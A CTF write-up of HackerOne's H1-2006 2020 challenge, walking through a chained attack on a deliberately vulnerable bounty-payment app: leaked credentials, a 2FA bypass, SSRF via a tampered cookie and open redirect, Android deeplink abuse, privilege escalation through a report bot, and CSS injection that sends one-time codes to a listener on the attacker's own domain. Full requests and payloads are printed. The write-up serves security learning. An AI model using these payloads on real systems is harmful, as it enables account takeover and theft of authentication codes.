---
comments: true
title: HackerOne H1-2006 2020 CTF Writeup
date: 2020-06-01 00:00:00 +0700
category:
- ctf
tags:
- ctf
private: false

---

## Writeup H1-2006 CTF

### The Big Picture

Given an web application with wildcard scope `*.bountyapp.h1ctf.com`, as stated at @Hacker0x01 Twitter the goal of the CTF is to help @martenmickos to approve May Bug Bounty payments.

![goals.png](/images/h12006/goals.png)

## Short Writeup (TL;DR)
#### Layer 1: Getting Credentials (CWE-538)

- Directory bruteforce app.bountypay.h1ctf.com found `.git` folder
- Found this github [https://github.com/bounty-pay-code/request-logger](https://github.com/bounty-pay-code/request-logger)
- Download this file [https://app.bountypay.h1ctf.com/bp_web_trace.log](https://app.bountypay.h1ctf.com/bp_web_trace.log) (containing credentials from `brian.oliver`, we used this to login at `customer.bountypay.h1ctf.com`)

#### Layer 2: Bypassing 2FA

- Logged in with the credentials
- View-source the page found `challenge` is an md5 hash of `challenge_answer`
- send `1` as 2FA and change the `challenge` to `c4ca4238a0b923820dcc509a6f75849b` which is an md5 hash of `1`
- we pass the 2FA 😊

#### Layer 3: SSRF (CWE-918) & Open Redirect (CWE-601)
After bypassing the 2FA and logged in:
- Decode the base64 cookie `token=<base64>`
- send post request to `/statements` and change the cookie `account_id` value to `F8gHiqSdpKx/../../../redirect?url=https://www.google.com/search?q=XXX#` as our `account_id` is used by the web server to make another request to `API server`.
- We can access software which is protected only for internal ip address by using this SSRF and Redirect  `F8gHiqSdpKx/../../../redirect?url=https://software.bountypay.h1ctf.com#`
- Directory bruteforcing to software app using the SSRF `F8gHiqSdpKx/../../../redirect?url=https://software.bountypay.h1ctf.com/FUZZING_FOLDER#` found `/uploads/` folder containing `BountyPay.apk` Android apps.

#### Layer 4: Android Apps (BountyPay.apk)

Using deeplink to solve all the part, i also use [Intent Launcher](https://play.google.com/store/apps/details?id=com.villevalta.intentlauncher&hl=en_SG)
- Open the app input anything as `name`
- Launch this deeplink for First part : `one://part?start=PartTwoActivity`
- Launch this deeplink for Second part : `two://part?two=light&switch=on` and inpit `X-Token`
- Launch this deeplink for Third part : `three://part?three=UGFydFRocmVlQWN0aXZpdHk=&switch=b24=&header=X-Token`
- grab the `X-Token` from the files `shared_preferences/user_created.xml` it will used as a header to hit the `api.bountypay.com` directly, the token can also submitted to `PartThreeActivity` to get `CongratsActivity`.

#### Layer 5: Exploiting API & OSINT

- Found this twitter [https://twitter.com/BountypayHQ](https://twitter.com/BountypayHQ)
- The account was following sandra which is new staff there [https://twitter.com/SandraA76708114](https://twitter.com/SandraA76708114)
- And sandra posting his picture with the id-card containing her staff-id [https://twitter.com/SandraA76708114/status/1258693001964068864](https://twitter.com/SandraA76708114/status/1258693001964068864)
- Generate staff account using the staff-id via api `https://api.bountypay.h1ctf.com/api/staff/` send `POST` with `staff_id` parameter.

#### Layer 6: Upgrading staff user to admin

- Modify classes avatar .upgradeToAdmin .tab4
- Report ticket `template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab4`
- Getting an admin cookie 🎉

#### Layer 7: Exploiting CSS Injection (CWE-73)

- Check May Bounty payment 
- Extract 2FA using CSS Injection,setup your callback and use this [evil.css](https://gist.github.com/abdilahrf/0b7d3c3958f036a31f575f364f42b8f3)
- Order the 2FA code and submit
- Got the FLAG `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`


_____________________________________________________________________
---

## Detailed Writeup

### Subdomain Enumeration

I always perform subdomain enumeration when it comes into wildcard targets and crt.sh always give most of the result.

![domains.png](/images/h12006/domains.png)

Found 5 subdomains :
- bountypay.h1ctf.com
- api.bountypay.h1ctf.com
- app.bountypay.h1ctf.com
- staff.bountypay.h1ctf.com
- software.bountypay.h1ctf.com

### Layer 1: Getting Credentials (CWE-538)

At this layer the only information we have is the target have 5 subdomains, then i perform basic enumeration for all of the domain the basic enumeration is (directory/parameter[cookie,post/get]/header/etc bruteforce).

I was found at the `app.bountypay.h1ctf.com` domain is have `.git` folder, i was able to access `app.bountypay.h1ctf.com/.git/config` which is contains a public repository `(https://github.com/bounty-pay-code/request-logger)` that contains code used to logs user request then encoded it with base64 and saved it within a file `bp_web_trace.log` and the file is accessible from the website `app.bountypay.h1ctf.com/bp_web_trace.log` after decoding the request i found credentials if a customer.

```
bp_web_trace.log

1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==

this is after decode the base64 
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}

```

I classified this vulnerability with [CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory](https://cwe.mitre.org/data/definitions/538.html).

### Layer 2: Bypassing 2FA
After logged in into the `brian.oliver` account at `app.bountypay.h1ctf.com` got an Login 2FA prompt, but quick view on the page source code it have an hidden input named `challenge` which i just guess at the first time it was an `md5 hash` of the `challenge_answer`, so if we can  control the `md5 hash` we can generate our own `md5 hash` as the `challenge` and send the `challenge_answer` of the challenge.

![2FA.png](/images/h12006/2FA.png)

Generate the md5 hash using cli with `echo -n 1 |md5sum` will return `c4ca4238a0b923820dcc509a6f75849b` and we can use this to bypass the 2FA `username=brian.oliver&password=V7h0inzX&challenge=c4ca4238a0b923820dcc509a6f75849b&challenge_answer=1`.


### Layer 3: SSRF (CWE-918) & Open Redirect (CWE-601)
Bypassing 2FA giving us the cookie to authenticate as the user, the authentication user only have 2 thing to try, logout and load transaction (app.bountypay.h1ctf.com/statements?month=06&year=2020), the logout function have nothing interesting and i look more deep into `/statements` endpoint.

I tried to asking question is the `month&year` parameter is accepting other than integer, after trial and error i found out that the `month&year` is only accept integer value and i can't do anything with that now.

also tried to decode the cookie `token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9` and the interesting part is our `account_id` is used by the web server to build new request into the `api.bountypay.h1ctf.com`, the cookie is not having tampering protection so i was able to modify the `account_id` and making the api to request another enpodints.

![API Account-id](/images/h12006/api-account-id.png)

I was using [Hackvector](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) to view the cookie as `plain text` and send it as `base64` this plugin is very handy, it was possible to make the backend send the request to another location.

also there is an open redirect on the api `https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API`, this endpoint only able to redirect to whitelisted domain, i was spent tons of hours to bypass but actually we don't need to bypass it, By combining the `open redirect` to the proxy request at `account_id` we can turn this into `SSRF`, Long story short `https://staff.bountypay.h1ctf.com` and `https://software.bountypay.h1ctf.com` is whitelisted into the redirect and i tried to access the `https://software.bountypay.h1ctf.com` with the proxy give me an login page with title `Software Storage`, this below the full request and response.
```
#Request
GET /statements?month=06&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,de;q=0.8,es;q=0.7,id;q=0.6,ms;q=0.5
Cookie: token=<@base64_0>{"account_id":"F8gHiqSdpK/../../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}<@/base64_0>

```

```
# Response
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 02 Jun 2020 08:07:07 GMT
Content-Type: application/json
Connection: close
Content-Length: 1621

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/#\/statements?month=06&year=2020","data":"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <h1 style=\"text-align: center\">Software Storage<\/h1>\n            <form method=\"post\" action=\"\/\">\n                <div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    <div class=\"panel-heading\">Login<\/div>\n                    <div class=\"panel-body\">\n                        <div style=\"margin-top:7px\"><label>Username:<\/label><\/div>\n                        <div><input name=\"username\" class=\"form-control\"><\/div>\n                        <div style=\"margin-top:7px\"><label>Password:<\/label><\/div>\n                        <div><input name=\"password\" type=\"password\" class=\"form-control\"><\/div>\n                    <\/div>\n                <\/div>\n                <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            <\/form>\n        <\/div>\n    <\/div>\n<\/div>\n<script src=\"\/js\/jquery.min.js\"><\/script>\n<script src=\"\/js\/bootstrap.min.js\"><\/script>\n<\/body>\n<\/html>"}
```

thingking of `Software Storage` the words of `backup files` always come into my mind and i tried to bruteforce the folder using the `proxy` and found there is an `/upload` folder containing `BountyPay.apk` which is the next challenges `https://software.bountypay.h1ctf.com/uploads/BountyPay.apk`

### Layer 4: Android Apps (BountyPay.apk)

The information leaked from the APK could be used for the next step, the goal from this apk to getting the value of `X-Token` to be able hit the `api.bountypay.h1ctf.com` directly.

By reading the `AndroidManifest.xml` file i assume the challenge have 3 part to solve and could be solve with using an deepling for each part.

![activity-scheme.png](/images/h12006/activity-scheme.png)

Opening the application will prompt you to input username and (optional) twitter, after you submit it will bring you to `PartOneActivity` but have nothing visible on the `User Interface`, it because this part of code haven't executed yet.

```
        if (getIntent() != null && getIntent().getData() != null && (firstParam = getIntent().getData().getQueryParameter("start")) != null && firstParam.equals("PartTwoActivity") && settings.contains("USERNAME")) {
            String user = settings.getString("USERNAME", "");
            SharedPreferences.Editor editor = settings.edit();
            String twitterhandle = settings.getString("TWITTERHANDLE", "");
            editor.putString("PARTONE", "COMPLETE").apply();
            logFlagFound(user, twitterhandle);
            startActivity(new Intent(this, PartTwoActivity.class));
        }
```

I use this deeplink to mark the `PARTONE` as `COMPLETE` `one://part?start=PartTwoActivity`, then we entered the `PartTwoActivity` there is also no `User Interface` visible because the code hide it 

![hide-it.png](/images/h12006/hide-it.png)

we can make it visible by supplying the right params on the deeplink `two://part?two=light&switch=on` and we prompted to enter header value we can enter `X-Token` got this value from `base64` on the `PartThreeActivity` code.

open the third activity with this deeplink `three://part?three=UGFydFRocmVlQWN0aXZpdHk=&switch=b24=&header=X-Token` the application will put the `Token` to `shared_preferences/user_created.xml` file and on the debug log, grab the leaked hash from this file `shared_preferences/user_created.xml` (8e9998ee3137ca9ade8f372739f062c1) and submitted to `PartThreeActivity`, from the debug log we can see that the Host is `api.bountypay.h1ctf.com` used `X-Token:8e9998ee3137ca9ade8f372739f062c1` to hit `api.bountypay.h1ctf.com/` endpoints was valid.

![intent-launcher.png](/images/h12006/intent-launcher.png) 

I am using [Intent Launcher](https://play.google.com/store/apps/details?id=com.villevalta.intentlauncher&hl=en_SG) to save all the deeplink history and [Wifi ADB](https://play.google.com/store/apps/details?id=com.ttxapps.wifiadb&hl=en_SG) to connect to my phone without wires.

### Layer 5: Exploiting API & OSINT
I was bruteforcing the `api.bountypay.h1ctf.com` endpoints using the valid `X-Token` that we got from android application was found an endpoint `api.bountypay.h1ctf.com/api/staff` which have `POST` and `GET` routes as `REST API` and the `GET` endpoint was returning the `staff_id&name` that already have an account

```
[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
```

but the `POST` method was expecting `staff_id` parameter to generate new account to staff that haven't generate account, and i was found an twitter account [@BountyPayHQ](https://twitter.com/BountypayHQ) which is mentioned by [@Hacker0x01](https://twitter.com/Hacker0x01), the @BountyPayHQ is mentioning that they have a new team member which is [Sandra Allison](https://twitter.com/SandraA76708114) in her twitter she uploaded an picture with the `staff_id` exposed

![sandra-staff.png](/images/h12006/sandra-staff.png)

Using sandra `staff_id` (STF:8FJ3KFISL3) on the `/api/staff [POST]` endpoint giving us the credentials.

![staff-credentials.png](/images/h12006/staff-credentials.png)

### Layer 6: Upgrading staff user to admin
Using the staff credentials to exploiting `staff.bountypay.h1ctf.com` the website still using base64 cookie but now its signed with something and it unreadable also we cannot tamper the cookie.

Reading the javascript give me clue that the admin have an ability to upgrade user to admin by sending a `GET` request, if i have an XSS on the `profile` name or `avatar` i can use `<img src="/admin/upgrade?username=sandra.allison">` to trigger the admin execute the upgrade user, but turns out that `profile` and `avatar` is cannot broken into an xss as it only accepts `[A-Za-z0-9]`

```
$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
}), $(".tab").click(function() {
    return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
}), $(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }), $("#myModal").modal("hide")
}), document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```

There is also a report endpoint that accepts an `url` from the user in `base64` encoded format tried to send `/admin/upgrade?username=sandra.allison` in base64 encoded but it doesn't work as the bot will ignore everything behind `/admin`.

A dead end :(, i stuck here quite long because the attack is very obscure and need to analyze every line of code, i assuming that the bot only able to access the ticket and i need to somehow set the payload on the ticket, our `profile_avatar` value it will return inside the `class` attribute of an `<img>` tag, first i add the `upgradeToAdmin` class but the upgradeToAdmin is need an `click` trigger i saw in the javascript have `tab4` class thathave an ability to trigger a click when we send `#tab4` on the url.

```
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Connection: close
Content-Length: 69
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://staff.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://staff.bountypay.h1ctf.com/?template=home
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,de;q=0.8,es;q=0.7,id;q=0.6,ms;q=0.5
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH

profile_name=undefined&profile_avatar=avatar2%20upgradeToAdmin%20tab4
```

now if we open the ticket with this url `https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582#tab4` this will trigger an ajax request to upgrade admin with `username=undefined` because the javascript trying to find value from `<input name="username">` which is only defined on the `?template=login` and i was found that we can select multiple template at once using array parameter.

![invalid-ajax.png](/images/h12006/invalid-ajax.png)

Opening this url `https://staff.bountypay.h1ctf.com/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab4` will give the valid request to upgrade user to admin, sending this url with `base64 encoded` will give you a cookie with min privs.

![correct-ajax.png](/images/h12006/correct-ajax.png)

send the report url to the bot give us the cookie

![admin-cookie.png](/images/h12006/admin-cookie.png)

with the admin cookie i can view the martenmickos password 

![marten-password.png](/images/h12006/marten-password.png)

Used it to login at `app.bountypay.h1ctf.com` exploiting css injection to bypass 2FA.

### Layer 7: Exploiting CSS Injection (CWE-73)

Login to marten account, trying to proccess the May bugbounty payment, but it was require an 2FA, the send challenge request was look like this

```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Content-Length: 73
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,de;q=0.8,es;q=0.7,id;q=0.6,ms;q=0.5
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

from `app_style` i assume this that we can control an css from a page, first come into my mind was `CSS Injection`,the backend was using headless chrome and only accepting connection `https`.

i tried to extract what value is on the page by using css, just tried most common tag and found `input[name^=X]` was work and i found the input name was `code_1|code_2|...|code_7`.

first i thought the code was like `<input name="code" valuie="abcdefg>"` if that your case using [https://github.com/d0nutptr/sic](https://github.com/d0nutptr/sic) from d0nutptr is very useful, in this case i still using it only as the listener and i run it with this command

```
 ./sic -p 3000 --ph "https://[yourdomain]" --ch "https://[yourdomain]k.xyz" -t test_template
```

and i write this [evil.css](https://gist.github.com/abdilahrf/0b7d3c3958f036a31f575f364f42b8f3) to extract code_1 to code_7 from the server, the listener will get back to you like this image below.

![extract-otp-using-css-injection.png](/images/h12006/extract-otp-using-css-injection.png)

you need to sort the code to `uICTuNw` and send it to the 2FA payment challenge to claim your flag `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`.

![solved-ctf.png](/images/h12006/solved-ctf.png)

### Closing Remark
Shout out to the problem setter [@adamtlangley](https://twitter.com/adamtlangley) and [@B3nac](https://twitter.com/B3nac) Thanks for making awesome CTF Challenge, also [@Hacker0x01](https://twitter.com/Hacker0x01) for Organizing the CTF, This was a great learning experience from solving the challenge.

Always keep the mindset `The bug is there, its just the matter of time to found the bug, if you don't others will found it.` this mindset help me to keep motivated when encounter a dead end.

### References & Tools Used
- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [CWE-601: URL Redirection to Untrusted Site ('Open Redirect')](https://cwe.mitre.org/data/definitions/601.html)
- [CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory](https://cwe.mitre.org/data/definitions/538.html)
- [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
- [PortSwigger: CSS Injection](https://portswigger.net/kb/issues/00501300_css-injection-reflected)
- [Sequential Import Chaining by @d0nutptr](https://github.com/d0nutptr/sic)
- [FFUF: Fuzz Faster U Fool](https://github.com/ffuf/ffuf)
- [Burpsuite Pro](https://portswigger.net/burp)
- [Intent Launcher](https://play.google.com/store/apps/details?id=com.villevalta.intentlauncher&hl=en_SG)
- [Wifi ADB](https://play.google.com/store/apps/details?id=com.ttxapps.wifiadb&hl=en_SG)

